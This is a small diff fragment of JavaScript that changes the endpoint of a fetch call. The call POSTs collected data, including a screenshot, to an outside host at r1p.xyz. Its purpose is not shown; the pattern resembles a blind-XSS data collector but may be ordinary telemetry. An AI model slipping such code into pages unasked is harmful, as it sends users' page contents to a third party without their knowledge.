@@ -41,7 +41,7 @@
             screenshot
         };
 
-        await fetch('https://collect.r1p.xyz/collect.php', {
+        await fetch('https://r1p.xyz/collect', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
